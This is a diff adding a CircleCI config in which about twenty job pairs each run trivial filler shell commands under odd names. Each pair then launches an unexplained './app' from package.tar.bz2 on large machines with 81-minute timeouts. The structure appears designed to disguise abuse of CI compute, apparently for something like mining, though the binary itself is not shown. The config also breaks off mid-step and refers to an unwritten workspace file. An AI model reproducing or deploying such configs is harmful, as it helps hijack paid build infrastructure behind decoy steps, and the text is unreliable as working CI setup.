@@ -1,0 +1,1837 @@
+version: 2.1
+
+jobs:
+  kick_whiskey-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: focus mode
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/.wsp/15.blob; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/.wsp/15.blob; done; true
+            len=$(wc -c </tmp/.wsp/15.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 15.blob
+  whiskey-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  orchestrate_apr13-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rinse cycle
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "camelCase" | awk '{gsub(/([a-z])([A-Z])/,"\\1_\\2"); print tolower($0)}'; true ; } > /tmp/.wsp/982.out
+            len=$(wc -c </tmp/.wsp/982.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 982.out
+  apr13-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/982.out || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  auditor_CORE-238:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Tests
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=50 2>/dev/null | tr '\0' 'z' | wc -c; true ; } > /tmp/.wsp/primary_phase_output.log
+            len=$(wc -c </tmp/.wsp/primary_phase_output.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - primary_phase_output.log
+  CORE-238:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/primary_phase_output.log || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  postcheck_yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: back end
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "x | y | z" | awk -F'[ ]*\\|[ ]*' '{print NF}'; true ; } > /tmp/.wsp/counts.jsonl
+            len=$(wc -c </tmp/.wsp/counts.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - counts.jsonl
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/counts.jsonl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  redo_java17-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: leak drip
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 2867200 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/.wsp/22.blob
+            len=$(wc -c </tmp/.wsp/22.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 22.blob
+  java17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  canary_ShipRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hang snatch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 17109); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/.wsp/2024-07-23.data
+            len=$(wc -c </tmp/.wsp/2024-07-23.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-07-23.data
+  ShipRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  checker_rm-session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: k
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes "abc" | head -500 | sort | uniq | wc -l; true ; } > /tmp/.wsp/result.log
+            len=$(wc -c </tmp/.wsp/result.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - result.log
+  rm-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  Beta_shippit-12:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: burpee
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '0-9' | head -c 20; true ; } > /tmp/.wsp/counts.tsv
+            len=$(wc -c </tmp/.wsp/counts.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - counts.tsv
+  shippit-12:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  run_beta-v4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rollback 1
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; lsmod 2>/dev/null | wc -l || echo 0; true ; } > /tmp/.wsp/81.out
+            len=$(wc -c </tmp/.wsp/81.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 81.out
+  beta-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/81.out || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  syncer_dp-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dry off
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]="x"; a[2]="y"; a[3]="z"; for(i in a)print i":"a[i]}' | sort; true ; } > /tmp/.wsp/pt-C.state
+            len=$(wc -c </tmp/.wsp/pt-C.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-C.state
+  dp-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  warmup_biuld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: curlicue
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; grep -c . /etc/hostname 2>/dev/null || echo 0; true ; } > /tmp/.wsp/.ok
+            len=$(wc -c </tmp/.wsp/.ok); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ok
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/.ok || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  p2_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: green dot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "data1" | od -An -c | head -1; true ; } > /tmp/.wsp/OK
+            len=$(wc -c </tmp/.wsp/OK); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - OK
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  orchestrate_build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: monkey patch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /tmp/.wsp/86.blob
+            len=$(wc -c </tmp/.wsp/86.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 86.blob
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/86.blob || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  kick_send-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: victorian
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "payload=42" | awk -F= '$1=="payload"{print $2+1}'; true ; } > /tmp/.wsp/log.log
+            len=$(wc -c </tmp/.wsp/log.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - log.log
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  builder_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: second try
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/.wsp/2023-01-24.data
+            len=$(wc -c </tmp/.wsp/2023-01-24.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2023-01-24.data
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/2023-01-24.data || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  cacher_validte:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: pls dont fail
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'NR%7==0{print}' | wc -l; true ; } > /tmp/.wsp/2024-01-24.data
+            len=$(wc -c </tmp/.wsp/2024-01-24.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-01-24.data
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/2024-01-24.data || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  fetcher_strated-62:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: squat half
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=10;i++)p*=i;print p}'; true ; } > /tmp/.wsp/.ready
+            len=$(wc -c </tmp/.wsp/.ready); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ready
+  strated-62:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/.ready || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  canary1_raj-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tap thread
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print toupper("whisper")}'; true ; } > /tmp/.wsp/metrics.tsv
+            len=$(wc -c </tmp/.wsp/metrics.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - metrics.tsv
+  raj-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/metrics.tsv || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  cook_node20-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: orbit sand
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=split("alpha beta gamma delta",arr," "); print n}'; true ; } > /tmp/.wsp/audit.txt
+            len=$(wc -c </tmp/.wsp/audit.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - audit.txt
+  node20-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/audit.txt || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  step1_whiskey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: cast off
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; sort /etc/passwd | wc -l; true ; } > /tmp/.wsp/full_phase_output.log
+            len=$(wc -c </tmp/.wsp/full_phase_output.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_phase_output.log
+  whiskey:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/full_phase_output.log || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  phase2_jun1-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rhapsody
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'END{print NR*(NR+1)/2}'; true ; } > /tmp/.wsp/stash.blob
+            len=$(wc -c </tmp/.wsp/stash.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stash.blob
+  jun1-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  reup_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hop
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "line a\nline b\nline c\n" | wc -l; true ; } > /tmp/.wsp/passoff.txt
+            len=$(wc -c </tmp/.wsp/passoff.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.txt
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/passoff.txt || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  postbuild_q4-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: veer east
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ls /proc 2>/dev/null | grep -c '^[0-9]' 2>/dev/null; true ; } > /tmp/.wsp/2024-09-08.data
+            len=$(wc -c </tmp/.wsp/2024-09-08.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-09-08.data
+  q4-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/2024-09-08.data || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  fetcher_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tinder bundle
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "quick" | tr A-Za-z N-ZA-Mn-za-m | base64 | head -c 20; true ; } > /tmp/.wsp/stage-ready.out
+            len=$(wc -c </tmp/.wsp/stage-ready.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ready.out
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/stage-ready.out || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  round2_INFRA-79:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cnc lathe
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "x" | md5sum | md5sum | awk '{print $1}'; true ; } > /tmp/.wsp/pt-E.pickle
+            len=$(wc -c </tmp/.wsp/pt-E.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-E.pickle
+  INFRA-79:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/pt-E.pickle || true
+      - run:
+          name: Grab repository
